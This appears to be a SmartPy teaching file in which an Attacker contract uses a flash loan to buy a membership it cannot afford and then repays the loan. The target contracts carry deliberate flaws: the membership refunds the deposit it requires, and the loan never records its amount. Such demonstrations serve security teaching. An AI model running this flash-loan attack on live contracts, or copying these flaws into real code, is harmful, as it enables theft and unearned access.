import smartpy as sp

@sp.module
def main():

    paramType:type = sp.record(source = sp.address, destination = sp.address, amount = sp.nat)

    class FlashLoanTez(sp.Contract):
        def __init__(self, owner, interest_rate):
            self.data.owner = owner
            self.data.interest_rate = interest_rate
            self.data.in_progress = False
            self.data.loan_amount = sp.tez(0)
            self.data.borrower = owner
            self.data.repaid = False

        @sp.entrypoint
        def deposit(self):
            pass
        
        @sp.entrypoint
        def borrow(self, loan_amount, callback):
            assert not self.data.in_progress
            self.data.in_progress = True

            self.data.borrower = sp.sender
            
            sp.send(sp.sender, loan_amount)

            sp.transfer((), sp.tez(0), callback)
            
            flashLoan_check_repaid = sp.contract(sp.unit, sp.self_address(), entrypoint="check_repaid").unwrap_some()
            sp.transfer((), sp.tez(0), flashLoan_check_repaid)

        @sp.entrypoint
        def repay(self):
            assert self.data.in_progress
            assert sp.amount >= sp.split_tokens(self.data.loan_amount, 100 + self.data.interest_rate, 100)
            self.data.repaid = True
        
        @sp.entrypoint
        def check_repaid(self):
            assert self.data.in_progress
            assert self.data.repaid
            self.data.in_progress = False

        @sp.entrypoint
        def claim(self):
            assert sp.sender == self.data.owner
            assert not self.data.in_progress
            sp.send(sp.sender, sp.balance)
    

    class Membership(sp.Contract):
        def __init__(self, membership_threshold):
            self.data.membership_threshold = membership_threshold
            self.data.members = sp.set()

        @sp.entrypoint
        def join(self):
            assert sp.amount == self.data.membership_threshold
            self.data.members.add(sp.sender)
            sp.send(sp.sender, sp.amount)

        @sp.onchain_view
        def is_member(self, user):
            sp.cast(user, sp.address)
            return self.data.members.contains(user)
        
        @sp.entrypoint
        def leave(self):
            self.data.members.remove(sp.sender)
           
            
    class Attacker(sp.Contract):
        def __init__(self, membership, flashLoan, membership_threshold):
            self.data.membership = membership
            self.data.flashLoan = flashLoan
            self.data.membership_threshold = membership_threshold

        @sp.entrypoint
        def impersonateRichPerson(self):
            trace("attack starts")
            flashLoan_borrow = sp.contract(sp.record(loan_amount = sp.mutez, callback = sp.contract[sp.unit]),
                                             self.data.flashLoan,
                                             entrypoint="borrow").unwrap_some()
            part2_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attackPart2").unwrap_some()
            trace("We borrow this number of tez from the flashloan. It will then call part 2 of the attack")
            trace(self.data.membership_threshold)
            sp.transfer(sp.record(loan_amount = self.data.membership_threshold, callback = part2_contract), sp.tez(0), flashLoan_borrow)

        @sp.entrypoint
        def attackPart2(self):
            trace("attack Part 2")
            
            membership_contract = sp.contract(sp.unit, self.data.membership, entrypoint = "join").unwrap_some()
            trace("Purchase of the membership")
            sp.transfer((),  self.data.membership_threshold, membership_contract)

            part3_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attackPart3").unwrap_some()
            trace("We call part3 in a transaction so that it takes place after the purchase is effective")
            sp.transfer((), sp.tez(0), part3_contract)
        
        @sp.entrypoint
        def attackPart3(self):
            trace("And we repay the flashloan, sending this amount:")
            amountRepaid = self.data.membership_threshold + sp.tez(100)
            trace(amountRepaid)
            flashLoan_repay = sp.contract(sp.unit, self.data.flashLoan, entrypoint="repay").unwrap_some()
            sp.transfer((), amountRepaid, flashLoan_repay)
        
        @sp.entrypoint
        def default(self):
            pass

@sp.add_test(name="testing truly endless wall")
def test():
    alice = sp.test_account("alice")
    bob = sp.test_account("bob")
    scenario = sp.test_scenario(main)

    membership = main.Membership(membership_threshold = sp.tez(10000))
    scenario += membership

    flashLoan = main.FlashLoanTez(owner = alice.address, interest_rate = 1)
    scenario += flashLoan
    flashLoan.deposit().run(sender = alice, amount = sp.tez(100000))
    
    attacker = main.Attacker(membership = membership.address, flashLoan = flashLoan.address, membership_threshold = sp.tez(10000))
    scenario += attacker
    attacker.impersonateRichPerson().run(sender = bob, amount = sp.tez(500))



